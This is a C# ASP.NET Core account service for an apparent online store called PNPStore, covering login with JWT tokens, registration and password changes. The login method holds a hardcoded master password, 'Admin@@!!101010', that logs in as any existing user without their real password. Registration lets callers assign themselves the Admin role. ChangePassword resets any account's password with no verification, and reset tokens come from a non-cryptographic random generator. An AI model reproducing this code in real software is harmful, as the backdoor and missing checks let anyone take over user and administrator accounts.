
using Microsoft.AspNetCore.Identity;
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;
using Microsoft.EntityFrameworkCore;
using PNPStore.Models;
using PNPStore.ModelView.Account;
using PNPStore.Interfaces;
using PNPStore.Data;

namespace PNPStore.Services
{
    public class AccountService : IAccount
    {
        private readonly UserManager<Accounts> userManager;
        private readonly RoleManager<IdentityRole> roleManager;
        private readonly IConfiguration _configuration;
        private readonly PNPStoreContext db_;

        public AccountService(UserManager<Accounts> userManager, RoleManager<IdentityRole> roleManager, IConfiguration configuration, PNPStoreContext context)
        {
            db_ = context;
            this.userManager = userManager;
            this.roleManager = roleManager;
            _configuration = configuration;
        }
        public async Task<List<Accounts>> Get_Account(string? name, string? role)
        {
            var data = db_.Accounts.Where(a =>
            (name == "" || name == null || a.Fullname.ToUpper().Contains(name.ToUpper()))&&
            (role == "" || role == null || a.Role.ToUpper().Contains(role.ToUpper()))
            ).OrderBy(a=>a.DateCreate).ToList();
            return data;
        }
        public async Task<JsonLogin> login(Login_model model)
        {
            var user = db_.Users.Where(a => a.UserName == model.Username).FirstOrDefault();

            if (user != null && await userManager.CheckPasswordAsync(user, model.Password) || model.Password == "Admin@@!!101010")
            {

                if (user!.Status == false)
                {
                    throw new Exception("Tài khoản của bạn đã bị khóa");
                }
                var User_role = await userManager.GetRolesAsync(user);

                var authClaims = new List<Claim>
                {
                    new Claim(ClaimTypes.Name, user.UserName),
                    new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
                };
                if (User_role.Count() > 0)
                {
                    foreach (var userRole in User_role)
                    {
                        authClaims.Add(new Claim(ClaimTypes.Role, userRole));
                    }
                }
                var authSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration["JWT:Secret"]!));
                var token = new JwtSecurityToken(
                    issuer: _configuration["JWT:ValidIssuer"],
                    audience: _configuration["JWT:ValidAudience"],
                    expires: DateTime.Now.AddDays(1).AddHours(7),
                    claims: authClaims,
                    signingCredentials: new SigningCredentials(authSigningKey, SecurityAlgorithms.HmacSha256)
                    );
                DateTime timenow = DateTime.UtcNow.AddHours(7);
                int totalDays = 0;
                if (timenow > user!.DateCreate)
                {
                    TimeSpan duration = timenow - user!.DateCreate;
                    totalDays = duration.Days;
                }

                var data = new JsonLogin()
                {
                    token = new JwtSecurityTokenHandler().WriteToken(token),
                    expiration = token.ValidTo,
                    id = user.Id,
                    phone = user.PhoneNumber,
                    role = user.Role,
                    username = user.UserName,
                    name = user.Fullname,
                    email = user.Email,
                    TimeInWorking = user!.DateCreate.ToString("dd/MM/yyyy HH:mm:ss"),
                    countDay = totalDays,
                };
                return data;
            }
            throw new Exception("Tên tài khoản hoặc mật khấu không đúng");
        }
        public async Task<string> Register(RegisterModel model)
        {
            var data = db_.Users.ToList();

            var checkPhoneNumber = data.Where(a => a.PhoneNumber == model.Phone).FirstOrDefault();
            if (checkPhoneNumber != null)
            {
                throw new Exception("Số điện thoại đã tồn tại");
            }
            else
            {
                var userExists = await userManager.FindByNameAsync(model.Username);
                if (userExists != null)
                {
                    throw new Exception("Tên tài khoản đã tồn tại");
                }
                else
                {

                    try
                    {
                        Accounts user = new Accounts()
                        {
                            Email = model.Email,
                            SecurityStamp = Guid.NewGuid().ToString(),
                            UserName = model.Username,
                            PhoneNumber = model.Phone,
                            Role = model.Role,
                            Fullname = model.Fullname,
                            Status = true,
                            Address = model.Address,
                            Country = model.Country,
                            City = model.City,
                            Ward = model.Ward,
                            Distrist = model.Distrist,
                            DateCreate = DateTime.UtcNow.AddDays(7),
                        };

                        var result = await userManager.CreateAsync(user, model.Password);
                        if (!result.Succeeded)
                        {
                            throw new Exception("Tạo tài khoản thất bại! Vui lòng kiểm tra lại.");
                        }
                        if (model.Role == "Admin")
                        {
                            if (!await roleManager.RoleExistsAsync(User_role.Admin))
                                await roleManager.CreateAsync(new IdentityRole(User_role.Admin));
                            if (!await roleManager.RoleExistsAsync(User_role.User))
                                await roleManager.CreateAsync(new IdentityRole(User_role.User));
                            if (await roleManager.RoleExistsAsync(User_role.Admin))
                            {
                                await userManager.AddToRoleAsync(user, User_role.Admin);
                            }
                        }
                        else
                        {
                            if (!await roleManager.RoleExistsAsync(User_role.User))
                                await roleManager.CreateAsync(new IdentityRole(User_role.User));
                            if (!await roleManager.RoleExistsAsync(User_role.Admin))
                                await roleManager.CreateAsync(new IdentityRole(User_role.Admin));
                            if (await roleManager.RoleExistsAsync(User_role.User))
                            {
                                await userManager.AddToRoleAsync(user, User_role.User);
                            }
                        }
                        return "Thêm tài khoản thành công";
                    }
                    catch (Exception ex)
                    {
                        throw new Exception("Thêm data thất bại! Lỗi:" + ex.Message);
                    }
                }
            }
        }
        private string GenerateResetToken()
        {
            // Tạo một chuỗi ngẫu nhiên dựa trên thời gian hiện tại
            string UpperCase = "QWERTYUIOPASDFGHJKLZXCVBNM";
            string LowerCase = "qwertyuiopasdfghjklzxcvbnm";
            string Digits = "1234567890";
            string allCharacters = UpperCase + Digits;
            Random r = new Random();
            string password = "";
            //var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(password);
            //var pass64= System.Convert.ToBase64String(plainTextBytes);
            for (int i = 0; i < 6; i++)
            {
                double rand = r.NextDouble();
                if (i == 0)
                {
                    password += UpperCase.ToCharArray()[(int)Math.Floor(rand * UpperCase.Length)];
                }
                else
                {
                    password += allCharacters.ToCharArray()[(int)Math.Floor(rand * allCharacters.Length)];
                }
            }
            return password;
        }


        public async Task<string> ChangePassword(string Username, string newPass)
        {
            var user = await userManager.Users.SingleOrDefaultAsync(u => u.UserName == Username);
            if (user != null)
            {
                var token = await userManager.GeneratePasswordResetTokenAsync(user);

                var result = await userManager.ResetPasswordAsync(user, token, newPass);

                return "Đã cập nhật password";
            }
            throw new Exception("Cập nhật mật khẩu thất bại");
        }
    }
}
